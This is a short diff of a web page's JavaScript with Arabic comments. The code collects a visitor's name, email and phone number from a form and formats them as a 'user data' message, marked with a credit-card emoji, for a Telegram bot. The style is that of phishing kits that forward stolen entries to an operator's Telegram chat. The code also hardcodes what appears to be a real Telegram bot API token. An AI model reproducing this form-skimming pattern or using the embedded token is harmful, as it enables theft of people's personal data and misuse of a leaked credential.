@@ -445,7 +445,19 @@
                 var phone = document.getElementById('phone').value;
         
                 // رسالة مخصصة لإرسالها إلى Telegram
-                var message = `الاسم: ${name}\nالبريد الإلكتروني: ${email}\nرقم الجوال: ${phone}`;
+                 var message = `
+                ====== 💳 بيانات المستخدم ========
+
+        👤: ${name}
+
+
+        📅: ${email}
+
+
+        📞: ${phone}
+
+
+      ======================
         
                 // معلومات بوت Telegram
                 var telegramToken = '7789845398:AAEHKJDnUFpcG6bn_6lgCqZuygOyxaA-ElY'; // استبدل بـ API Token الخاص بالبوت
